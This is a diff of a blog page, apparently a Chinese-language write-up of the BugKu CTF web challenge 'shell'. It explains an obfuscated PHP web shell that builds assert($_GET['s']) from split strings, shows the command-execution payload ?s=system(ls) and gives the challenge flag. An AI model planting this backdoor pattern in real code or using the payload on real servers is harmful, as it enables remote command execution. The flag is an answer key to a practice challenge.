@@ -789,7 +789,7 @@ mjx-container[display="true"] + br {
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>278 字</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>268 字</span>
         </span>
     
     
@@ -813,31 +813,16 @@ mjx-container[display="true"] + br {
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="BugKu-WEB-shell"><a href="#BugKu-WEB-shell" class="headerlink" title="BugKu-WEB-shell"></a>BugKu-WEB-shell</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../img-posts/2025-09-02-BugKu-WEB-shell/%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0.png"
-                      alt="Question"
-                ><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../img-posts/2025-09-02-BugKu-WEB-shell/%E9%A2%98%E7%9B%AE%E7%BD%91%E9%A1%B5.png"
-                      alt="Question"
-                ></p>
+			<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="BugKu-WEB-shell"><a href="#BugKu-WEB-shell" class="headerlink" title="BugKu-WEB-shell"></a>BugKu-WEB-shell</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img lazyload="" src="/images/loading.svg" data-src="/../img-posts/2025-09-02-BugKu-WEB-shell/%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0.png" alt="Question"><br><img lazyload="" src="/images/loading.svg" data-src="/../img-posts/2025-09-02-BugKu-WEB-shell/%E9%A2%98%E7%9B%AE%E7%BD%91%E9%A1%B5.png" alt="Question"></p>
 <h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>题目中给了思路</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$poc</span>=<span class="string">&quot;a#s#s#e#r#t&quot;</span>; <span class="variable">$poc_1</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$poc</span>); <span class="variable">$poc_2</span>=<span class="variable">$poc_1</span>[<span class="number">0</span>].<span class="variable">$poc_1</span>[<span class="number">1</span>].<span class="variable">$poc_1</span>[<span class="number">2</span>].<span class="variable">$poc_1</span>[<span class="number">3</span>].<span class="variable">$poc_1</span>[<span class="number">4</span>].<span class="variable">$poc_1</span>[<span class="number">5</span>]; <span class="variable">$poc_2</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]) </span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$poc</span>=<span class="string">"a#s#s#e#r#t"</span>; <span class="variable">$poc_1</span>=<span class="title function_ invoke__">explode</span>(<span class="string">"#"</span>,<span class="variable">$poc</span>); <span class="variable">$poc_2</span>=<span class="variable">$poc_1</span>[<span class="number">0</span>].<span class="variable">$poc_1</span>[<span class="number">1</span>].<span class="variable">$poc_1</span>[<span class="number">2</span>].<span class="variable">$poc_1</span>[<span class="number">3</span>].<span class="variable">$poc_1</span>[<span class="number">4</span>].<span class="variable">$poc_1</span>[<span class="number">5</span>]; <span class="variable">$poc_2</span>(<span class="variable">$_GET</span>[<span class="string">'s'</span>]) </span><br></pre></td></tr></table></figure></div>
 
-<p>可以先看看<code>explode()</code>函数的<a class="link"   target="_blank" rel="noopener" href="https://www.runoob.com/php/func-string-explode.html" >文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>和<code>assert()</code>函数的<a class="link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.assert.php" >文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>代码的大概意思是，定义poc为一个用#隔开的字符串，定义poc_1为用#隔开的数组，比如说poc_1[0]&#x3D;a，poc_1[1]&#x3D;s，以此类推<br>然后定义poc_2是poc_1数组之间元素拼起来的结果，最后使用poc_2并对从GET方法那里获得的内容进行处理<br>这串代码看似很复杂，其实就是把poc_2变成<code>assert()</code>函数再去处理GET方法得到的内容，也就是assert($_GET[‘s’])<br><code>assert()</code>会把即使是不符合php代码规范的字符串变成php代码去执行，也就是说可以把s定义成各种各样的linux命令执行，比如说</p>
+<p>可以先看看<code>explode()</code>函数的<a class="link" target="_blank" rel="noopener" href="https://www.runoob.com/php/func-string-explode.html">文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>和<code>assert()</code>函数的<a class="link" target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.assert.php">文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>代码的大概意思是，定义poc为一个用#隔开的字符串，定义poc_1为用#隔开的数组，比如说poc_1[0]=a，poc_1[1]=s，以此类推<br>然后定义poc_2是poc_1数组之间元素拼起来的结果，最后使用poc_2并对从GET方法那里获得的内容进行处理<br>这串代码看似很复杂，其实就是把poc_2变成<code>assert()</code>函数再去处理GET方法得到的内容，也就是assert($_GET[‘s’])<br><code>assert()</code>会把即使是不符合php代码规范的字符串变成php代码去执行，也就是说可以把s定义成各种各样的linux命令执行，比如说</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=system(ls)</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../img-posts/2025-09-02-BugKu-WEB-shell/ls.png"
-                      alt="Question"
-                ></p>
+<p><img lazyload="" src="/images/loading.svg" data-src="/../img-posts/2025-09-02-BugKu-WEB-shell/ls.png" alt="Question"></p>
 <p>也就是在后台执行了ls的命令，此时可以看到flag文件，再打开<em>flaga15808abee46a1d5.txt</em>文件就可以看到flag了</p>
-<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;da87a1289abe10c9055a70acefff8879&#125;</span><br></pre></td></tr></table></figure></div>
+<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{da87a1289abe10c9055a70acefff8879}</span><br></pre></td></tr></table></figure></div>
 
 		</div>
 
@@ -1003,7 +988,7 @@ mjx-container[display="true"] + br {
               <span>2025</span>
               -
             
-            2025&nbsp;&nbsp;<i class="fa-duotone fa-solid fa-display-code"></i>&nbsp;&nbsp;<a href="/">Mel0ny</a>
+            2026&nbsp;&nbsp;<i class="fa-duotone fa-solid fa-display-code"></i>&nbsp;&nbsp;<a href="/">Mel0ny</a>
             
                 
                 <p class="post-count space-x-0.5">
@@ -1012,7 +997,7 @@ mjx-container[display="true"] + br {
                     </span>
                     
                         <span>
-                            共 26.4k 字
+                            共 25.6k 字
                         </span>
                     
                 </p>
